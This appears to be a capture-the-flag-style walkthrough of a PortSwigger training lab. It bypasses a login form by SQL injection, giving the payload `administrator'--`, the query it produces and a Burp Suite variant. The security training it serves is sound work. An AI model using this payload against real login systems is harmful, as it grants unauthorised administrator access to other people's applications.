# Lab: SQL injection vulnerability allowing login bypass

This lab contains an [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the login function.

To solve the lab, perform an SQL injection attack that logs in to the application as the `administrator` user.

![lab-sql-login-bypass.png](./image/lab-sql-login-bypass.png)

# Attack

### Navigate to the login form

![screenshot00.png](./image/screenshot00.png)

### Analyzing the form inputs

![screenshot01.png](./image/screenshot01.png)

### Try `admin:admin`

![screenshot02.png](./image/screenshot02.png)

![screenshot03.png](./image/screenshot03.png)

Invalid username or password.

## Try first payload

![screenshot04.png](./image/screenshot04.png)

![screenshot05.png](./image/screenshot05.png)

## Attack Payload

```
administrator'--
test
```

![screenshot06.png](./image/screenshot06.png)

This results into having a query of:

```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

## Solved

![lab-solved.png](./image/lab-solved.png)

# Other Solutions

## Burp Suite

1. Use Burp Suite to intercept and modify the login request.
2. Modify the `username` parameter, giving it the value: `administrator'--`

## Community Solution

Rana Khalil

[SQL Injection - Lab #2 SQL injection vulnerability allowing login bypass](https://youtu.be/ML3aGaloczI)

Michael Sommer

[SQL injection vulnerability allowing login bypass (Video solution, Audio)](https://youtu.be/4FGkpyYYfCs)

